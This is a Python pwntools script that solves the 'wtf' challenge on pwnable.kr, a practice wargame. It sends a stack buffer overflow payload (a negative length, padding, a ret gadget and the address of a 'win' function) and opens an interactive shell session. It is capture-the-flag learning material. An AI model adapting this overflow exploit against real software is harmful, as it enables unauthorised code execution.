from pwn import *

exe = ELF("./wtf", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10039

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

RET = 0x4006c3

def main():
    r  = conn()

    payload = b"-1\n" + b"a" * 0x1035 + \
        pack(RET) + pack(exe.symbols.win) + b"\n"

    if args.LOCAL:
        r.sendline(payload)
    else:
        r.sendline(payload.hex().encode())
        
    r.interactive()

if __name__ == "__main__":
    main()
